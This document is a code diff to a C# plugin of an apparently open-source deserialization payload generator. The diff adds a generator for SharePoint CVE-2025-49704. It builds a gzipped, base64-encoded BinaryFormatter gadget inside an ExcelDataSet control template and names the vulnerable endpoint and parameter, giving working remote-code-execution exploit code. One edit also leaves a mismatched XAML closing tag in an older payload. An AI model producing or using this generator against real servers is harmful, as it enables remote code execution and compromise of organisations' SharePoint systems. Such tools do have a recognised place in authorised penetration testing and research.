@@ -1,7 +1,10 @@
 ﻿using NDesk.Options;
 using System;
 using System.Collections.Generic;
+using System.IO;
+using System.IO.Compression;
 using System.Linq;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Text.RegularExpressions;
 using ysonet.Generators;
@@ -17,6 +20,7 @@ using ysonet.Helpers;
  *      CVE-2020-1147: https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
  *      CVE-2019-0604: https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
  *      CVE-2018-8421: https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/
+ *      CVE-2025-49704: https://blog.viettelcybersecurity.com/sharepoint-toolshell/
  **/
 
 namespace ysonet.Plugins
@@ -27,13 +31,15 @@ namespace ysonet.Plugins
         static string gadget = "TypeConfuseDelegate";
         static string command = "";
         static bool useurl = false;
+        static int variant = 1; // Add variant support for CVE-2025-49704
 
         static OptionSet options = new OptionSet()
             {
-                {"cve=", "the CVE reference: CVE-2020-1147 (result is safe for a POST request), CVE-2019-0604, CVE-2018-8421", v => cve = v },
+                {"cve=", "the CVE reference: CVE-2025-49704 (url-encoded), CVE-2020-1147 (url-encoded), CVE-2019-0604, CVE-2018-8421", v => cve = v },
                 {"useurl", "to use the XAML url rather than using the direct command in CVE-2019-0604 and CVE-2018-8421", v => useurl = v != null },
                 {"g|gadget=", "a gadget chain that supports LosFormatter for CVE-2020-1147. Default: TypeConfuseDelegate ", v => gadget = v },
                 {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://b8.ee/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
+                {"var|variant=", "Variant number for CVE-2025-49704 only. Choices: 1 (default, uses DataSetOldBehaviourGenerator variant 2), 2 (uses DataSetOldBehaviourFromFileGenerator variant 2)", v => int.TryParse(v, out variant) },
             };
 
         public string Name()
@@ -43,12 +49,12 @@ namespace ysonet.Plugins
 
         public string Description()
         {
-            return "Generates payloads for the following SharePoint CVEs: CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
+            return "Generates payloads for the following SharePoint CVEs: CVE-2025-49704, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
         }
 
         public string Credit()
         {
-            return "CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
+            return "CVE-2025-49704: Khoa Dinh - implemented by Soroush Dalili, CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
         }
 
         public OptionSet Options()
@@ -103,6 +109,13 @@ namespace ysonet.Plugins
                                 "\r\n The payload needs to be sent (POST request) in the __SUGGESTIONSCACHE__ parameter to /_layouts/15/quicklinks.aspx?Mode=Suggestion or /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion " +
                                 "\r\n-->";
                     break;
+                case "cve-2025-49704":
+                    payload = CVE_2025_49704();
+                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
+                                "https://blog.viettelcybersecurity.com/sharepoint-toolshell/" +
+                                "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx" +
+                                "\r\n-->";
+                    break;
             }
 
             if (String.IsNullOrEmpty(payload))
@@ -115,6 +128,73 @@ namespace ysonet.Plugins
 
             return payload;
         }
+
+        public string CVE_2025_49704()
+        {
+            InputArgs inputArgs = new InputArgs();
+            inputArgs.Cmd = command;
+            inputArgs.IsRawCmd = true;
+            inputArgs.Minify = false; // minimisation of payload is not important here but we can do it if needed!
+            inputArgs.UseSimpleType = false; // minimisation of payload is not important here but we can do it if needed!
+
+            string final_payload_template = @"<%@ Register Tagprefix=""ScorecardClient"" Namespace=""Microsoft.PerformancePoint.Scorecards"" Assembly=""Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>
+
+<asp:UpdateProgress ID=""Update"" DisplayAfter=""1"" 
+runat=""server"">
+<ProgressTemplate>
+  <div>            
+    <ScorecardClient:ExcelDataSet CompressedDataTable=""{GzipPayload}"" DataTable-CaseSensitive=""false"" runat=""server""/>
+  </div>
+</ProgressTemplate>
+</asp:UpdateProgress>";
+
+            byte[] payload_bytes;
+
+            if (variant == 2)
+            {
+                // Variant 2: Use DataSetOldBehaviourFromFileGenerator variant 2
+                DataSetOldBehaviourFromFileGenerator dsFromFileGenerator = new DataSetOldBehaviourFromFileGenerator();
+                
+                inputArgs.ExtraInternalArguments = new List<string> { 
+                    "--spoofedAssembly", "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                    "-var", "2"
+                };
+
+                payload_bytes = (byte[]) dsFromFileGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
+            }
+            else
+            {
+                // Variant 1 (default): Use DataSetOldBehaviourGenerator variant 2
+                DataSetOldBehaviourGenerator dsGenerator = new DataSetOldBehaviourGenerator();
+
+                inputArgs.ExtraInternalArguments = new List<string> { 
+                    "--spoofedAssembly", "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                    "-var", "2"
+                };
+
+                payload_bytes = (byte[]) dsGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
+            }
+
+            byte[] compressedBytes;
+            using (var memoryStream = new MemoryStream())
+            {
+                // leave the memoryStream open after disposing gzipStream so we can read it
+                using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
+                {
+                    gzipStream.Write(payload_bytes, 0, payload_bytes.Length);
+                }
+
+                // At this point gzipStream is disposed and all data is flushed into memoryStream
+                compressedBytes = memoryStream.ToArray();
+            }
+
+            string base64Result = Convert.ToBase64String(compressedBytes);
+
+            // minimisation of payload is not important here but we can do it if needed!
+
+            return final_payload_template.Replace("{GzipPayload}", base64Result).Replace("+", "%2B").Replace("&", "%26"); // POST body safe (minimal url-encoding)
+        }
+
 
         public string CVE_2020_1147()
         {
@@ -245,7 +325,7 @@ Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Rd=""c
 Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" xmlns:ODP=""clr-namespace:System.Windows.Data;Assembly=PresentationFramework, Version=4.0.0.0, Culture=neutral,    
 PublicKeyToken=31bf3856ad364e35"">
 <ODP:ObjectDataProvider x:Key=""LaunchCmd"" MethodName=""Start"">
-<ObjectDataProvider.ObjectInstance><Diag:Process><Diag:Process.StartInfo>" + cmdPart + @"</Diag:ProcessStartInfo></Diag:Process.StartInfo></Diag:Process>
+<ObjectDataProvider.ObjectInstance><Diag:Process><Diag:Process.StartInfo>" + cmdPart + @"</Diag:ProcessStartInfo></Diag:Process>
 </ObjectDataProvider.ObjectInstance>
 </ODP:ObjectDataProvider>
 </Rd:ResourceDictionary>
